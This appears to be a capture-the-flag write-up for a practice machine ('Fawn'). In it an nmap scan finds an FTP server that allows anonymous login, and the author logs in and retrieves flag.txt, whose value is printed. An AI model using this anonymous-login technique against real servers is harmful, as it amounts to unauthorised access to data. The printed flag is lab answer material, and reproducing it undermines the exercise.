This box is about "FTP".

FTP is a file transfer service.

### Scan
```
┌──(kali㉿kali)-[~/htb/fawn]
└─$ nmap -sC -sV 10.129.234.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 20:12 EST
Nmap scan report for 10.129.234.156
Host is up (0.018s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.24
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
```
### Use anonymous account, type in whatever password
```
┌──(kali㉿kali)-[~/htb/fawn]
└─$ ftp 10.129.234.156
Connected to 10.129.234.156.
220 (vsFTPd 3.0.3)
Name (10.129.234.156:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21923|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||15050|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*********************************************************************|    32      459.55 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (1.84 KiB/s)
ftp> ^D
221 Goodbye.
                                                                                                                  
┌──(kali㉿kali)-[~/htb/fawn]
└─$ cat flag.txt 
035db21c881520061c53e0536e44f815
```